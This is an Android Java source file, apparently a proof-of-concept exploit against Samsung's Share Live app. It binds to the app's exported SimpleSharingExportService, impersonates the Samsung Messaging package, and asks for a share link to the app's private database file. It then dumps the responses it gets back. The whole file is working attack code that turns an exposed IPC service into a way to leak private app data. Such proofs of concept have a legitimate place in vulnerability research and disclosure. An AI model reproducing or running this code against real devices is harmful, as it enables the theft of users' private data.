package poc.app;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;

import com.samsung.android.sdk.simplesharing.ExchangeData;
import com.samsung.android.sdk.simplesharing.ISimpleSharingCallback;
import com.samsung.android.sdk.simplesharing.ISimpleSharingSdk;

import java.util.ArrayList;
import java.util.Arrays;

public class MainActivity extends Activity {
    private ServiceConnection mServiceConnection = new ServiceConnection() {
        public void onServiceConnected(ComponentName cName, IBinder service) {
            MainActivity.this.service = ISimpleSharingSdk.Stub.asInterface(service);
            processBinder();
        }

        public void onServiceDisconnected(ComponentName cName) {
        }
    };

    private ISimpleSharingSdk service;

    private ISimpleSharingCallback.Stub callback = new ISimpleSharingCallback.Stub() {
        @Override
        public void onResponse(Bundle bundle) {
            DumpUtils.dump(bundle, getClassLoader());
        }
    };

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent i = new Intent();
        i.setClassName("com.samsung.android.app.sharelive", "com.samsung.android.app.sharelive.linkexportservice.SimpleSharingExportService");
        bindService(i, mServiceConnection, BIND_AUTO_CREATE);
    }

    private void processBinder() {
        try {
            ExchangeData data = new ExchangeData(0, 0, "com.samsung.android.messaging", 0);
            service.exchangeData(data);

            service.checkServiceRegistered(new Bundle(), callback);
            service.getPolicy(new Bundle(), callback);
            service.getQuota(new Bundle(), callback);

            Bundle bundle = new Bundle();
            bundle.putStringArrayList("contentUris", new ArrayList<>(Arrays.asList("file:///data/user/0/com.samsung.android.app.sharelive/databases/share_live.db")));
            service.requestShareLink(bundle, callback);
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }
}